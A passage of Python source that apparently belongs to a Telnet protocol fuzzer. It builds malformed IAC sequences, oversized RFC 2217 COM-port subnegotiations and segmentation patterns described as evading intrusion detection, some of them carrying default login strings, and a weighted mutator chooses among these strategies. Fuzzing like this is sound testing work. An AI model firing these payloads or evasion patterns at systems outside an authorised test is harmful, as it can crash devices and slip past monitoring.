            payload += bytes([_IAC])  # orphan IAC
            payload += bytes([random.randint(0xF0, 0xFE)])  # looks like command
    elif variant == 4:
        # Rapid data/command mode toggling
        payload = b""
        for _ in range(random.randint(500, 2000)):
            payload += bytes([random.randint(0x20, 0x7E)])  # data
            payload += bytes([_IAC, random.choice([_NOP, _GA, _AYT])])  # command
    elif variant == 5:
        # 5-byte IAC sequences (IAC IAC IAC IAC IAC — parser sees 2.5 literal 0xFF?)
        payload = bytes([_IAC]) * 5 * random.randint(100, 500)
    elif variant == 6:
        # IAC at exact power-of-2 boundaries
        payload = b""
        for exp in range(8, 13):  # 256 to 4096
            payload += b"X" * ((1 << exp) - 1) + bytes([_IAC])
    else:
        # Alternating IAC-data-IAC patterns
        payload = b""
        for _ in range(random.randint(500, 2000)):
            payload += bytes([_IAC, random.randint(0x00, 0xFF)])
    return payload, _TELNET_PORT


def _build_comport_option_overflow():
    """COM Port Control Option (RFC 2217) abuse.

    COM Port Option (44) enables serial-port configuration over Telnet.
    SB data: <command-byte> + params.  Tests: oversized baud rate value,
    all command codes (0-12+), unknown command codes (128-255), SET_CONTROL
    with invalid flow control, SET_LINESTATE with all bits, rapid port
    configuration cycling, SET_MODEMSTATE with invalid bits.
    """
    _CPC_SIGNATURE   = 0
    _CPC_SET_BAUDRATE = 1
    _CPC_SET_DATASIZE = 2
    _CPC_SET_PARITY   = 3
    _CPC_SET_STOPSIZE = 4
    _CPC_SET_CONTROL  = 5
    _CPC_SET_LINESTATE_MASK = 11
    _CPC_SET_MODEMSTATE_MASK = 12

    variant = random.randint(0, 6)
    if variant == 0:
        # Oversized baud rate
        data = bytes([_CPC_SET_BAUDRATE]) + struct.pack(">I", 0xFFFFFFFF)
        payload = _iac_cmd(_WILL, _OPT_COMPORT) + _iac_sb(_OPT_COMPORT, data)
    elif variant == 1:
        # All command codes in sequence
        payload = _iac_cmd(_WILL, _OPT_COMPORT)
        for cmd_code in range(13):
            data = bytes([cmd_code]) + _rand_bytes(random.randint(4, 100))
            payload += _iac_sb(_OPT_COMPORT, data)
    elif variant == 2:
        # Unknown command codes
        payload = _iac_cmd(_WILL, _OPT_COMPORT)
        for _ in range(random.randint(50, 200)):
            data = bytes([random.randint(128, 255)]) + _rand_bytes(random.randint(10, 500))
            payload += _iac_sb(_OPT_COMPORT, data)
    elif variant == 3:
        # SET_CONTROL with invalid flow control values
        payload = _iac_cmd(_WILL, _OPT_COMPORT)
        for val in [0, 0xFF, 0x80, 0x7F, 0x10, 0x20]:
            data = bytes([_CPC_SET_CONTROL, val])
            payload += _iac_sb(_OPT_COMPORT, data)
    elif variant == 4:
        # SET_LINESTATE with all bits set
        data = bytes([_CPC_SET_LINESTATE_MASK, 0xFF])
        payload = _iac_cmd(_WILL, _OPT_COMPORT) + _iac_sb(_OPT_COMPORT, data)
    elif variant == 5:
        # Rapid port configuration cycling
        payload = _iac_cmd(_WILL, _OPT_COMPORT)
        for _ in range(random.randint(200, 1000)):
            baud = random.choice([300, 1200, 9600, 19200, 115200, 0xFFFFFFFF])
            data = bytes([_CPC_SET_BAUDRATE]) + struct.pack(">I", baud)
            payload += _iac_sb(_OPT_COMPORT, data)
    else:
        # Oversized signature
        data = bytes([_CPC_SIGNATURE]) + _rand_bytes(random.randint(2000, 10000))
        payload = _iac_cmd(_WILL, _OPT_COMPORT) + _iac_sb(_OPT_COMPORT, data)
    return payload, _TELNET_PORT


def _build_tcp_segmentation_evasion(payload_override=None):
    """TCP segmentation for IDS evasion — Ptacek & Newsham pattern.

    Full Telnet message designed to be split at IAC boundaries, mid-option,
    or mid-command.  Tests: 1-byte TCP segments, split at IAC/command boundary,
    split inside SB data, large padded payload, split at login prompt boundary,
    interleaved IAC between segments.
    NOTE: payload delivered as one block; actual TCP segmentation handled by
    the transport layer.
    """
    if payload_override is not None:
        payload = _iac_cmd(_WILL, _OPT_TERMTYPE)
        payload += _iac_sb(_OPT_TERMTYPE, bytes([_TT_IS]) + b"xterm")
        payload += payload_override + b"\r\n"
        return payload, _TELNET_PORT
    variant = random.randint(0, 5)
    if variant == 0:
        # Login sequence with IAC options — designed for tiny segments
        payload = _iac_cmd(_WILL, _OPT_TERMTYPE)
        payload += _iac_sb(_OPT_TERMTYPE, bytes([_TT_IS]) + b"xterm-256color")
        payload += _iac_cmd(_WILL, _OPT_NAWS)
        payload += _iac_sb(_OPT_NAWS, struct.pack(">HH", 80, 24))
        payload += b"admin\r\npassword123\r\n"
    elif variant == 1:
        # Large payload designed for 1-byte segments
        payload = b""
        for _ in range(random.randint(100, 500)):
            payload += _iac_cmd(_NOP) + bytes([random.randint(0x20, 0x7E)])
    elif variant == 2:
        # Split-friendly: option negotiation + command
        payload = _iac_cmd(_DO, _OPT_SGA)
        payload += _iac_cmd(_DO, _OPT_ECHO)
        payload += _iac_cmd(_WILL, _OPT_NAWS)
        payload += _iac_sb(_OPT_NAWS, struct.pack(">HH", 132, 43))
        payload += b"USER admin\r\n"
        # Pad to ensure splits hit interesting boundaries
        payload += b"A" * random.randint(500, 2000)
    elif variant == 3:
        # Many small SB sequences
        payload = b""
        for _ in range(random.randint(50, 200)):
            opt = random.choice([_OPT_TERMTYPE, _OPT_NEWENV, _OPT_NAWS])
            payload += _iac_sb(opt, _rand_bytes(random.randint(2, 20)))
    elif variant == 4:
        # Duplicate login with overlap simulation
        login = b"admin\r\npassword\r\n"
        payload = login + login  # repeated for overlap
        payload += _iac_cmd(_NOP) * random.randint(100, 500)
    else:
        # Minimal request under minimum segment threshold
        payload = _iac_cmd(_WILL, _OPT_SGA) + b"x\r\n"
    return payload, _TELNET_PORT


# ── Dispatcher ──────────────────────────────────────────────────────────────

_BUILDERS = {
    "iac_sequence_injection":          _build_iac_sequence_injection,
    "option_negotiation_flood":        _build_option_negotiation_flood,
    "subnegotiation_overflow":         _build_subnegotiation_overflow,
    "naws_window_manipulation":        _build_naws_window_manipulation,
    "terminal_type_overflow":          _build_terminal_type_overflow,
    "environment_variable_injection":  _build_environment_variable_injection,
    "authentication_option_abuse":     _build_authentication_option_abuse,
    "encrypt_option_exploit":          _build_encrypt_option_exploit,
    "command_injection_evasion":       _build_command_injection_evasion,
    "line_ending_confusion":           _build_line_ending_confusion,
    "data_mark_urgent_abuse":          _build_data_mark_urgent_abuse,
    "iac_escape_desync":               _build_iac_escape_desync,
    "comport_option_overflow":         _build_comport_option_overflow,
    "tcp_segmentation_evasion":        _build_tcp_segmentation_evasion,
}


_TELNET_OVERRIDE_CAPABLE = frozenset([
    "iac_sequence_injection", "encrypt_option_exploit",
    "command_injection_evasion", "iac_escape_desync",
    "tcp_segmentation_evasion",
])

def build_telnet_payload(strategy: str, payload_override=None):
    """Return (payload_bytes, dst_port) for the given strategy."""
    builder = _BUILDERS.get(strategy)
    if builder is None:
        builder = _build_iac_sequence_injection
    if payload_override is not None and strategy in _TELNET_OVERRIDE_CAPABLE:
        payload, dst_port = builder(payload_override=payload_override)
    else:
        payload, dst_port = builder()
    return _clamp(payload), dst_port


# ── Mutator class ──────────────────────────────────────────────────────────

class TelnetMutator:
    def __init__(self, external_weights=None, bandit=None):
        self.strategies = TELNET_STRATEGIES
        self._external_weights = external_weights
        self._bandit = bandit

    @property
    def weights(self):
        if self._external_weights:
            return [self._external_weights.get(s, 5) for s in self.strategies]
        return TELNET_WEIGHTS

    def mutate(self, payload_override=None):
        """Returns (payload_bytes, strategy_name, dst_port)."""
        if self._bandit:
            strategy = self._bandit.select_with_weights(self._external_weights or {})
        else:
            strategy = random.choices(self.strategies, weights=self.weights, k=1)[0]
        payload, dst_port = build_telnet_payload(strategy, payload_override=payload_override)
        return payload, strategy, dst_port
